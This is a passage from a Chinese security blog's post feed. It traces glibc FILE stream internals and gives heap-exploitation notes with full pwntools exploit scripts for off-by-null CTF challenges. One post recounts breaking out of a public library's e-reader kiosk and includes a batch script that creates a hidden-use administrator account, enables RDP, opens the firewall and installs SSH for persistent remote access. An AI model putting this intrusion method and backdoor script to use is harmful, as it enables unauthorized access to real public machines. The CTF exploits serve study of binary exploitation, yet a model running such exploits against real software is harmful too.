f-&gt;_IO_write_ptr; if (count &gt;= n) &#123; const char *p; for (p = s + n; p &gt; s; ) &#123; if (*--p == &apos;\\n&apos;) &#123; count = p - s + 1; must_flush = 1; break; &#125; &#125; &#125; &#125; else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr) count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; /* Space available. */ 这一段判断了缓冲区剩余的空间，存在了count中123456789/* Then fill the buffer. */ if (count &gt; 0) &#123; if (count &gt; to_do)count = to_do; f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count); s += count; to_do -= count; &#125; 如果缓冲区还有剩余，则将数据拷贝至输出缓冲区。并计算是否还有目标输出剩余12345678 if (to_do + must_flush &gt; 0) &#123; size_t block_size, do_write; /* Next flush the (full) buffer. */ if (_IO_OVERFLOW (f, EOF) == EOF)/* If nothing else has to be written we must not signal the caller that everything has been written. */return to_do == 0 ? EOF : n - to_do; _IO_OVERFLOW-&gt;_IO_new_file_overflow如果还有剩余，则说明缓冲区未建立或已经满了，需要使用_IO_OVERFLOW刷新缓冲区。跟进该函数，是位于fileops.c中的_IO_new_file_overflow12int_IO_new_file_overflow (_IO_FILE *f, int ch) 继续跟进，先检查是否有_IO_NO_WRITE标志位123456if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ &#123; f-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; &#125; 检查_IO_write_base是否为空，若为空则分配输出缓冲区。这里调用的是_IO_doallocbuf来分配，与fread中相同。12345678 if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL) &#123; /* Allocate a buffer if needed. */ if (f-&gt;_IO_write_base == NULL)&#123; _IO_doallocbuf (f); _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);&#125; 跟进_IO_setg，是一句宏，将与read相关的三个指针赋值为_IO_buf_base12#define _IO_setg(fp, eb, g, eg) ((fp)-&gt;_IO_read_base = (eb),\\ (fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg)) 可以看下修改结果12345678_IO_read_ptr = 0x603480 &quot;&quot;, _IO_read_end = 0x603480 &quot;&quot;, _IO_read_base = 0x603480 &quot;&quot;, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x603480 &quot;&quot;, _IO_buf_end = 0x604480 &quot;&quot;, 再之后就是相关指针的设置，对读写相关的指针与flags等进行了赋值。123456789_flags = -72536956, --&gt; 0xfbad2c84_IO_read_ptr = 0x603480 &quot;&quot;, _IO_read_end = 0x603480 &quot;&quot;, _IO_read_base = 0x603480 &quot;&quot;, _IO_write_base = 0x603480 &quot;&quot;, _IO_write_ptr = 0x603480 &quot;&quot;, _IO_write_end = 0x604480 &quot;&quot;, _IO_buf_base = 0x603480 &quot;&quot;, _IO_buf_end = 0x604480 &quot;&quot;, 赋值之后就要开始调用_IO_do_write函数。12345if ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &apos;\\n&apos;)) if (_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF) return EOF; _IO_do_write-&gt;_IO_new_do_write跟进调用了fileops.c中的_IO_new_do_write1234567int_IO_new_do_write (FILE *fp, const char *data, size_t to_do)&#123; return (to_do == 0 || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;&#125;libc_hidden_ver (_IO_new_do_write, _IO_do_write) new_do_write看到主要调用了new_do_write函数，位于该函数下方。12static size_tnew_do_write (FILE *fp, const char *data, size_t to_do) 看到刚开始进行了标志位的判断，然后看read_end与write_base是否存在偏移，有则调用_IO_SYSSEEK校正指针位置。1234567891011121314151617 if (fp-&gt;_flags &amp; _IO_IS_APPENDING) /* On a system without a proper O_APPEND implementation, you would need to sys_seek(0, SEEK_END) here, but is not needed nor desirable for Unix- or Posix-like systems. Instead, just indicate that offset (before and after) is unpredictable. */ fp-&gt;_offset = _IO_pos_BAD; else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) &#123; off64_t new_pos= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD)return 0; fp-&gt;_offset = new_pos; &#125; if (fp-&gt;_cur_column &amp;&amp; count) fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1; 之后调用_IO_SYSWRITE输出输出缓冲区的内容。1count = _IO_SYSWRITE (fp, data, to_do); _IO_SYSWRITE-&gt;_IO_new_file_write跟进_IO_SYSWRITE查看输出缓冲区的内容是怎样被输出的1234567891011121314151617181920212223ssize_t_IO_new_file_write (FILE *f, const void *data, ssize_t n)&#123; ssize_t to_do = n; while (to_do &gt; 0) &#123; ssize_t count = (__builtin_expect (f-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, 0) ? __write_nocancel (f-&gt;_fileno, data, to_do) : __write (f-&gt;_fileno, data, to_do)); if (count &lt; 0) &#123; f-&gt;_flags |= _IO_ERR_SEEN; break; &#125; to_do -= count; data = (void *) ((char *) data + count); &#125; n -= to_do; if (f-&gt;_offset &gt;= 0) f-&gt;_offset += n; return n;&#125; 可以看到执行了系统调用__write来将其输出。 返回之后调用_IO_setg刷新缓冲区指针并返回。1234567 _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base); fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base; fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end); return count;&#125; 返回到_IO_new_file_xsputn中继续往后走，计算了buf是否为比较大的block（0x1000），如果是则直接调用new_do_write进行输出1234567891011 /* Try to maintain alignment: write a whole number of blocks. */ block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base; do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0); if (do_write)&#123; count = new_do_write (f, s, do_write); to_do -= count; if (count &lt; do_write) return n - to_do;&#125; 最后处理缓冲区剩余数据，将剩余数据输出至输出缓冲区123456 /* Now write out the remainder. Normally, this will fit in the buffer, but it&apos;s somewhat messier for line-buffered files, so we let _IO_default_xsputn handle the general case. */ if (to_do)to_do -= _IO_default_xsputn (f, s+do_write, to_do); &#125; 关于这里只将数据输出到输出缓冲区而没有将其写至文件，其实是主函数会调用 _IO_flush_all_lockp()函数来清空缓冲区，该函数会在下面三种情况下被调用： 1：当 libc 执行 abort 流程时。 2：当执行 exit 函数时。当执行流从 main 函数返回时 3：当执行流从 main 函数返回时 _IO_default_xsputn这里调用的是_IO_default_xsputn，跟进该函数，跳转到genops.c中的_IO_default_xsputn123456789101112131415161718192021222324252627for (;;) &#123; /* Space available. */ if (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end) &#123; size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; if (count &gt; more) count = more; if (count &gt; 20) &#123; f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count); s += count; &#125; else if (count) &#123; char *p = f-&gt;_IO_write_ptr; ssize_t i; for (i = count; --i &gt;= 0; ) *p++ = *s++; f-&gt;_IO_write_ptr = p; &#125; more -= count; &#125; if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF) break; more--; &#125; 这里对剩余大小不同进行了分别处理，如果大于20则调用__memcpy,否则使用for循环直接赋值。最后如果输出缓冲区为0，则直接调用_IO_OVERFLOW输出，之后返回，这个流程基本就结束了。最后看下此时的fp，bcede…是data2中的数据。12345678_IO_read_ptr = 0x603480 &quot;bcdefghij1234567890&quot;, _IO_read_end = 0x603480 &quot;bcdefghij1234567890&quot;, _IO_read_base = 0x603480 &quot;bcdefghij1234567890&quot;, _IO_write_base = 0x603480 &quot;bcdefghij1234567890&quot;, _IO_write_ptr = 0x603494 &quot;&quot;, _IO_write_end = 0x604480 &quot;&quot;, _IO_buf_base = 0x603480 &quot;bcdefghij1234567890&quot;, _IO_buf_end = 0x604480 &quot;&quot;, fclose框架主要是对链接入_IO_list_all中的FILE结构体，还有fread，fwrite建立的输入输出缓冲区进行释放处理。 细节fclose-&gt;_IO_new_fclose跟进fclose，进入了iofclose.c中的_IO_new_fclose函数，开始先对fp进行了检查1CHECK_FILE(fp, EOF); 之后第一步：unlink，将fp从_IO_list_all中脱下。这里需要注意下，在后面的利用中，为了能够直接调用_io_finish，会这里进行修改来绕过unlink与io_close 123 /* First unlink the stream. */if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp); _IO_un_link跟进该函数，是位于genops.c中的_IO_un_link123456789101112131415161718192021222324252627282930313233void_IO_un_link (struct _IO_FILE_plus *fp)&#123; if (fp-&gt;file._flags &amp; _IO_LINKED) &#123; FILE **f;#ifdef _IO_MTSAFE_IO _IO_cleanup_region_start_noarg (flush_cleanup); _IO_lock_lock (list_all_lock); run_fp = (FILE *) fp; _IO_flockfile ((FILE *) fp);#endif if (_IO_list_all == NULL) ; else if (fp == _IO_list_all) _IO_list_all = (struct _IO_FILE_plus *) _IO_list_all-&gt;file._chain; else for (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain) if (*f == (FILE *) fp) &#123; *f = fp-&gt;file._chain; break; &#125; fp-&gt;file._flags &amp;= ~_IO_LINKED;#ifdef _IO_MTSAFE_IO _IO_funlockfile ((FILE *) fp); run_fp = NULL; _IO_lock_unlock (list_all_lock); _IO_cleanup_region_end (0);#endif &#125;&#125;libc_hidden_def (_IO_un_link) 可以看到，开始时先检查标志位_flags，之后判断_IO_list_all是否为空，不为空看是否在表头，若不再表头则遍历_IO_list_all单链表进行寻找。最后对其标志位_flags进行修改，该标志位表明了是否位于_IO_list_all链表中。 返回之后，调用_IO_file_close_it函数关闭释放缓冲区 1234if (fp-&gt;_flags &amp; _IO_IS_FILEBUF) status = _IO_file_close_it (fp); else status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0; _IO_file_close_it跟进该函数123456789101112131415161718192021222324252627282930313233343536373839int_IO_new_file_close_it (FILE *fp)&#123; int write_status; if (!_IO_file_is_open (fp)) return EOF; if ((fp-&gt;_flags &amp; _IO_NO_WRITES) == 0 &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0) write_status = _IO_do_flush (fp); else write_status = 0; _IO_unsave_markers (fp); int close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == 0 ? _IO_SYSCLOSE (fp) : 0); /* Free buffer. */ if (fp-&gt;_mode &gt; 0) &#123; if (_IO_have_wbackup (fp)) _IO_free_wbackup_area (fp); _IO_wsetb (fp, NULL, NULL, 0); _IO_wsetg (fp, NULL, NULL, NULL); _IO_wsetp (fp, NULL, NULL); &#125; _IO_setb (fp, NULL, NULL, 0); _IO_setg (fp, NULL, NULL, NULL); _IO_setp (fp, NULL, NULL); _IO_un_link ((struct _IO_FILE_plus *) fp); fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS; fp-&gt;_fileno = -1; fp-&gt;_offset = _IO_pos_BAD; return close_status ? close_status : write_status;&#125;libc_hidden_ver (_IO_new_file_close_it, _IO_file_close_it) 首先通过标志位_fileno 判断了文件是否打开，然后对其标志位进行了判断，目的是判断是否为输出缓冲区，是则调用_IO_do_flush刷新缓冲区。查看_IO_do_flush，发现是宏定义1234567#define _IO_do_flush(_f) \\ ((_f)-&gt;_mode &lt;= 0 \\ ? _IO_do_write(_f, (_f)-&gt;_IO_write_base, \\ (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base) \\ : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base, \\ ((_f)-&gt;_wide_data-&gt;_IO_write_ptr \\ - (_f)-&gt;_wide_data-&gt;_IO_write_base))) 可以看到主要调用_IO_do_write将输出缓冲区输出。此时原先在输出缓冲区中的值才会被写入文件，所以一般程序运行中没有close的话打开文件可能会发现还没有写进去就是这个原因。再之后对_markers标志位进行了处理。然后可以看到后面调用了_IO_SYSCLOSE函数，看到是fileops.c中的_IO_file_close _IO_SYSCLOSE-&gt;_IO_file_close1234567891011int_IO_file_close (FILE *fp)&#123; /* Cancelling close should be avoided if possible since it leaves an unrecoverable state behind. */ return close_not_cancel (fp-&gt;_fileno);&#125;libc_hidden_def (_IO_file_close)``` 看到主要调用了close_not_cancel，而它本身是个宏定义， #define close_not_cancel(fd) \\ __close (fd)1234实际就是通过系统调用__close关闭返回之后,调用_IO_setb/_IO_setg/_IO_setp，其中_IO_setb是设置结构体的buf指针， _IO_setg是设置read相关的指针，_IO_setp是设置write相关的指针 _IO_setb (fp, NULL, NULL, 0); _IO_setg (fp, NULL, NULL, NULL); _IO_setp (fp, NULL, NULL);123##### _IO_setb进入_IO_setb，可以看到释放了缓冲区 void_IO_setb (_IO_FILE f, char b, char *eb, int a){ if (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF)) free (f-&gt;_IO_buf_base); f-&gt;_IO_buf_base = b; f-&gt;_IO_buf_end = eb; if (a) f-&gt;_flags &amp;= ~_IO_USER_BUF; else f-&gt;_flags |= _IO_USER_BUF;}libc_hidden_def (_IO_setb)12返回之后，再次调用了_IO_un_link _IO_un_link ((struct _IO_FILE_plus *) fp); fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS; fp-&gt;_fileno = -1; fp-&gt;_offset = _IO_pos_BAD; return close_status ? close_status : write_status;12345返回到_IO_new_close函数，最后调用_IO_FINISH，进入到fileopsc.c中的_IO_new_file_finish#### _IO_FINISH-&gt;_IO_new_file_finish 看到先检查文件是否仍打开，如果打开就刷新缓冲区并关闭，不过之前已经关闭过了，这里会直接进入genops.c中的_IO_default_finish void_IO_new_file_finish (FILE *fp, int dummy){ if (_IO_file_is_open (fp)) { _IO_do_flush (fp); if (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE)) _IO_SYSCLOSE (fp); } _IO_default_finish (fp, 0);}libc_hidden_ver (_IO_new_file_finish, _IO_file_finish)123##### _IO_default_finish可以看到还是对缓冲区的释放，指针的释放等等 void_IO_default_finish (FILE fp, int dummy){ struct _IO_marker mark; if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF)) { free (fp-&gt;_IO_buf_base); fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = NULL; } for (mark = fp-&gt;_markers; mark != NULL; mark = mark-&gt;_next) mark-&gt;_sbuf = NULL; if (fp-&gt;_IO_save_base) { free (fp-&gt;_IO_save_base); fp-&gt;_IO_save_base = NULL; } _IO_un_link ((struct _IO_FILE_plus *) fp); #ifdef _IO_MTSAFE_IO if (fp-&gt;_lock != NULL) _IO_lock_fini (*fp-&gt;_lock); #endif}libc_hidden_def (_IO_default_finish)12345678最后返回后对fp指针进行了free，就结束了。# 2.24 checklibc 2.24 之后专门添加了对虚表的检查，分别是/libio/libioP.h中的IO_validate_vtable 与 /libio/vtables.c中的_IO_vtable_check。所有的 libio vtables 被放进了专用的只读的 __libc_IO_vtables 段，以使它们在内存中连续。在任何间接跳转之前，vtable 指针将根据段边界进行检查，如果指针不在这个段，则调用函数 _IO_vtable_check() 做进一步的检查，并且在必要时终止进程。 / Perform vtable pointer validation. If validation fails, terminate the process. /static inline const struct _IO_jump_t IO_validate_vtable (const struct _IO_jump_t vtable){ / Fast path: The vtable pointer is within the __libc_IO_vtables section. / uintptr_t section_length = stop_libc_IO_vtables - start_libc_IO_vtables; uintptr_t ptr = (uintptr_t) vtable; uintptr_t offset = ptr - (uintptr_t) start_libc_IO_vtables; /* 对vtable指针范围进行检查，不满足则调用_IO_vtable_check进行检查 if (__glibc_unlikely (offset &gt;= section_length)) / The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. / _IO_vtable_check (); return vtable;} void attribute_hidden_IO_vtable_check (void){ #ifdef SHARED / Honor the compatibility flag. / void (*flag) (void) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables); #ifdef PTR_DEMANGLE PTR_DEMANGLE (flag); #endif if (flag == &amp;_IO_vtable_check) return; / In case this libc copy is in a non-default namespace, we always need to accept foreign vtables because there is always a possibility that FILE objects are passed across the linking boundary. / { Dl_info di; struct link_map l; if (!rtld_active () || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) != 0 &amp;&amp; l-&gt;l_ns != LM_ID_BASE)) return; } #else / !SHARED / / We cannot perform vtable validation in the static dlopen case because FILE handles might be passed back and forth across the boundary. Therefore, we disable checking in this case. */ if (__dlopen != NULL) return; #endif __libc_fatal (“Fatal error: glibc detected an invalid stdio handle\\n”);} `","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"io_file","slug":"io-file","permalink":"http://siriuswhiter.tk/tags/io-file/"}]},{"title":"Problem Solve Tricks","slug":"problem-solve-tricks","date":"2019-07-06T03:42:41.000Z","updated":"2019-07-07T15:06:52.437Z","comments":true,"path":"2019/07/06/problem-solve-tricks/","link":"","permalink":"http://siriuswhiter.tk/2019/07/06/problem-solve-tricks/","excerpt":"","text":"malloc_hook &amp;&amp; one_gadget之前经常遇到one_gadget条件不满足使得最后覆盖malloc_hook之后无法getshell，前两天从ex师傅那里学到了一个好办法。 将one_gadget 填入realloc_hook处，然后malloc_hook处填上__libc_realloc处的地址，因为调用realloc时会先检测realloc_hook，所以仍然能够调用one_gadget，为了能够满足one_gadget的条件（一般是对栈内存有要求），可以通过realloc代码开始处的寄存器push操作来进行栈帧调整，使得条件满足来getshell","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"}]},{"title":"终端渗透记录-lib","slug":"终端渗透记录-lib","date":"2019-06-15T02:39:25.000Z","updated":"2019-06-18T14:25:10.974Z","comments":true,"path":"2019/06/15/终端渗透记录-lib/","link":"","permalink":"http://siriuswhiter.tk/2019/06/15/终端渗透记录-lib/","excerpt":"","text":"前两天复习时无聊，在图书馆看到用来读电子报纸期刊之类的终端，突发奇想想试试能不能把控制下来 上面就是一个界面，可以选择期刊报纸之类的，第一个想法就是看能不能先把其他的应用调出来 一般触控的主机，长按是相当于鼠标右键的点击的，在主页上打开右键，发现里面有全局设置 再打开全局设置的话，看到了有关于flash插件播放器的问题，看样子是需要联网的，点击链接会调出浏览器，同时出现的还有加速球hhh，get！ 后面在尝试调用右键的时候经常会半天出不来，这时可以进到关于简介的地方，随便把一句话括起来，就会出现复制打印之类的选项 选择打印会弹出小框，而且也会弹出加速球，有了加速球其实就好解决了 加速器本身很难点进去，长按也没啥反应，但是加速球带着网络速度的检查，而在网速检查中，有推荐你清理垃圾的选项hhh 点击清理垃圾就能够把电脑管家给召唤出来。 为了能够更方便的操作，先将电脑中的teamviewer升级（ps:神奇的是之前确实是有下好的），但是没法打开，或者是打开也看不到 类似于是看报的界面是置顶的，在电脑管家中找找还有什么好用的软件，之前在浏览器里下载的搜狗输入法直接被删了，或许是有检测 但是看样子teamviewer之前就是用电脑管家下的，或许这里的不会被删掉，为了后面更加方便，这里下载了搜狗输入法（ps:不用问没有输入法怎么下的，毕竟榜单前列） 在看电脑管家工具箱时看到了桌面整理和小Q桌面hhh，尝试使用桌面整理，下载安装完之后，突然出现了桌面hhh 想打开我的电脑，但是打开就被直接关闭了，后台应该是有应用在监控文件管理器的打开（其实想看有啥东西还是挺简单的，浏览器查看本机文档完全无障碍），想开任务管理器，软键盘欲罢不能 后面一通操作之后，桌面又出不来了（哭），就勉强使用小Q桌面一用，打开之前升级的teamviewer，电子邮箱不能输入（暴哭） 到这一步感觉没办法的时候，索性重装一下teamviewer，bingo，远程连接ok了hhh 不过这样子实在是不安全，万一到时候拿着teamviewer账号找上门就尴尬了，好在先teamviewer控制，后面带电脑过去操控就比较方便了。 目前的想法，为了能够更方便地控制还不被被监控端看到，完全可以传一个远控码过去，因为没有能绕过监控的码（菜），不过应该是可以用teamviewer放到白名单然后开机自启动吧hhh。 没有码只能建个新的管理员权限的用户然后开通ssh服务远程连接使用，为了方便流程写了个bat脚本,隐藏用户的方法没建成功，就在最后设置成开机不要求密码来解决每天自动开机后卡在登陆界面的问题（主要是为了方便操作，没有能够隐蔽操作，打开文件之类的都是拿teamviewer提前传好的） 1234567891011121314151617181920212223242526272829303132333435net user administratore admin /addnet user administratore /active:yesnet user administratore /expires:nevernet localgroup Administrators administratore /addREG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /fREG ADD &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /fnetsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allowstart C:\\Users\\Administrator\\Library\\setupssh-8.0p1-2.exe pausecd C:\\openSSH\\binmkgroup -l &gt;&gt; ..\\etc\\groupmkpasswd -l &gt;&gt; ..\\etc\\passwdmd homemd home\\Administratormd home\\Administrator\\.sshecho C:\\openSSHecho Protocol 2 &gt;&gt; C:\\openSSH\\etc\\sshd_configecho PermitRootLogin no &gt;&gt; C:\\openSSH\\etc\\sshd_configecho PermitEmptyPasswords no &gt;&gt; C:\\openSSH\\etc\\sshd_configecho PasswordAuthentication yes &gt;&gt; C:\\openSSH\\etc\\sshd_configecho RSAAuthentication yes &gt;&gt; C:\\openSSH\\etc\\sshd_configecho PubkeyAuthentication yes &gt;&gt; C:\\openSSH\\etc\\sshd_configecho AuthorizedKeysFile .ssh/authorized_keys &gt;&gt; C:\\openSSH\\etc\\sshd_confignet start opensshdreg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Cygnus&quot; &quot;Solutions\\Cygwin\\mounts&quot; &quot;v2\\/home Yesreg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Cygnus&quot; &quot;Solutions\\Cygwin\\mounts&quot; &quot;v2\\/home /v native /t REG_SZ /d &quot;C:\\openSSH\\home&quot;reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Cygnus&quot; &quot;Solutions\\Cygwin\\mounts&quot; &quot;v2\\/home /v flags /t REG_DWORD /d 0x0000000astart control userpassword2pause","categories":[],"tags":[]},{"title":"off-by-null --more challenge","slug":"off-by-null-more-challenge","date":"2019-06-08T00:49:05.000Z","updated":"2019-06-10T05:05:29.903Z","comments":true,"path":"2019/06/08/off-by-null-more-challenge/","link":"","permalink":"http://siriuswhiter.tk/2019/06/08/off-by-null-more-challenge/","excerpt":"","text":"level 0之前随便出的题 障碍低版本libc，没有开启PIE，常见的四项功能都有，edit中存在off-by-null 12345678910111213141516void get_str(char *ptr,int size)&#123; int tmp=0; if(size&lt;0)&#123; return; &#125; for(int i=0;i&lt;size;i++)&#123; read(0,(ptr+i),1); tmp = i; if(*(ptr+i)==&apos;\\n&apos;)&#123; break; &#125; &#125; *(ptr+tmp+1)=0; return;&#125; 之前信安大赛提供的赛题就是这个难度的洞，上面为源码。 思路没有开启PIE其实就很简单，基本上各方面都没有太多限制，通过溢出overlap来控制指针，下面要么直接控制修改malloc_hook处，要么麻烦一点改bss段指针再任意地址写getshell，之前是直接修改为one_gadget后条件不满足，顺便就把PIE给关了，难度低一点友好点没啥坏处。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *#context.log_level = &apos;debug&apos;sh = process(&apos;./tinynote&apos;)elf = ELF(&apos;./tinynote&apos;)libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)def add(size,note): sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;) sh.sendlineafter(&apos;Size: &apos;,str(size)) sh.sendlineafter(&apos;Note: \\n&apos;,note)def show(idx): sh.sendlineafter(&apos;&gt; &apos;,&apos;2&apos;) sh.sendlineafter(&apos;index: &apos;,str(idx))def edit(idx,size,note): sh.sendlineafter(&apos;&gt; &apos;,&apos;3&apos;) sh.sendlineafter(&apos;index: &apos;,str(idx)) sh.sendlineafter(&apos;size: &apos;,str(size)) sh.sendlineafter(&apos;Note: \\n&apos;,note)def dele(idx): sh.sendlineafter(&apos;&gt; &apos;,&apos;4&apos;) sh.sendlineafter(&apos;index: &apos;,str(idx))#--------------over lapping---------------add(0x90,&apos;0&apos;)add(0x18,&apos;1&apos;)add(0x18,&apos;2&apos;)add(0x110,&apos;3&apos;*0xf0+p64(0x100)+p64(0x21))add(0x18,&apos;4&apos;)dele(0)edit(2,0x18,&apos;2&apos;*0x10+p64(0xe0))dele(3)#gdb.attach(sh)#-------------leak libc---------------------add(0x90,&apos;0&apos;)show(1)leak = u64(sh.recv(8))libc_base = leak-88-0x3c4b20print hex(libc_base)one = libc_base +0x4526a#+libc.symbols[&apos;system&apos;]#--------------------------------------#edit(1,0x18,p64(leak)+p64(leak-88-0x33))#add(0x60,&apos;a&apos;*0x13)add(0x18,&apos;3&apos;)add(0x60,&apos;5&apos;)dele(2)edit(5,8,p64(0x60203d))add(0x60,&apos;2&apos;)add(0x60,&apos;\\x00&apos;*0x13+p64(0x90)+p64(1)+p64(libc.symbols[&apos;__free_hook&apos;]+libc_base))edit(0,8,p64(one))dele(2)sh.interactive() level 1西湖论剑的一道题目貌似 障碍libc版本升级到2.27左右，存在tcache机制，许多操作开始需要绕过tcache机制来实现，但整体思路没有太大的变化。同时这个题的溢出点从edit到了add，相对麻烦一点就是了。 思路多分配一些chunk来将tcache填满，之后对剩下的chunk进行off-by-null实现overlap，好处就是tcache减少了对size的检查，后面更容易实现 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#!/usr/bin/env python2import sysfrom pwn import *#context.log_level = &apos;debug&apos;#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]if len(sys.argv) &gt; 1: local = 0else: local = 1if local: sh = process(&apos;xihu&apos;) elf = ELF(&apos;xihu&apos;) libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)else: sh = remote(&apos;&apos;,&apos;&apos;) elf = ELF(&apos;xihu&apos;) #libc=ELF(&apos;&apos;)def add(size,con): sh.sendlineafter(&apos;command:\\n&apos;,&apos;1&apos;) sh.sendlineafter(&apos;size:\\n&apos;,str(size)) sh.sendlineafter(&apos;content:\\n&apos;,con)def show(index): sh.sendlineafter(&apos;command:\\n&apos;,&apos;3&apos;) sh.sendlineafter(&apos;enter index:\\n&apos;,str(index))def dele(index): sh.sendlineafter(&apos;command:\\n&apos;,&apos;2&apos;) sh.sendlineafter(&apos;enter index:\\n&apos;,str(index))def edit(index,con): sh.sendlineafter(&apos;command:\\n&apos;,&apos;4&apos;) sh.sendlineafter(&apos;enter index:\\n&apos;,str(index)) sh.sendafter(&apos;content:\\n&apos;,con)for i in range(10): add(0xf7,str(i)*0x20)for i in range(8): dele(i)#----------------unsorted bin leak libc-------------------------------# #gdb.attach(sh)add(0xf8,&apos;&apos;)#0for i in range(1,7): add(0xf7,str(i)) #1-6add(0xf7, &apos;7&apos;) #7edit(7, &apos;a&apos; * 8)show(7)sh.recvuntil(&apos;a&apos;*8)libc_base = u64(sh.recvuntil(&apos;\\n&apos;,drop=True).ljust(8,&apos;\\x00&apos;)) - 0x3ebca0print &quot;libc: &quot;+hex(libc_base)free_hook = libc_base + libc.sym[&apos;__free_hook&apos;]one_gadget = libc_base + 0x4f322#---------------tcache leak heap -------------------------------------# #gdb.attach(sh)edit(0,&apos;0&apos;)show(0)heap_base = u64(sh.recvuntil(&apos;\\n&apos;,drop=True).ljust(8,&apos;\\x00&apos;))-0x730print hex(heap_base)#------fake chunk unlink #---chunk extend cover fd ptr--------------#chunk0_addr = heap_base + 0x850fake_chunk = chunk0_addr + 0x10pay = p64(0)+p64(0xf0)+p64(fake_chunk)+p64(fake_chunk)+&apos;a&apos;*0xd0+p64(0xf0)edit(0,pay)dele(8)for i in range(1,7): dele(i)dele(7)for i in range(1,8): add(0xf7,str(i))add(0xf7,&apos;8&apos;)dele(2)dele(8)pay = p64(0)+p64(0x101)+p64(free_hook)edit(0,pay)add(0,&apos;&apos;)#gdb.attach(sh)add(0xf7,&apos;&apos;)edit(8,p64(one_gadget))dele(0)#gdb.attach(sh)sh.interactive() level 2rctf 2019-babyheap 障碍较低版本libc，开启PIE，但是禁用了fastbin，同时关闭了system execve的系统调用这样基本上无法覆盖bss段的指针，即使想办法可以控制malloc_hook或free_hook指针，也无法直接系统调用getshell 思路通过chunk overlap泄露libc地址，再次调用通过house of storm控制free_hook，把free_hook地址设置为setcontext函数，从而控制程序流执行mprotect函数把__free_hook所在内存也修改为可执行，然后读入我们新的shellcode，在跳到新的shellcode去执行getshell。 另一种思路，泄露堆地址与libc地址，写rop, shellcode到heap，largebin attack &amp; unsortbin attack直接在libc上的free_hook分配chunk将栈转移到heap上，执行rop，执行shellcode getshell。 这里的shellcode都是通过open read write来实现flag的读取。 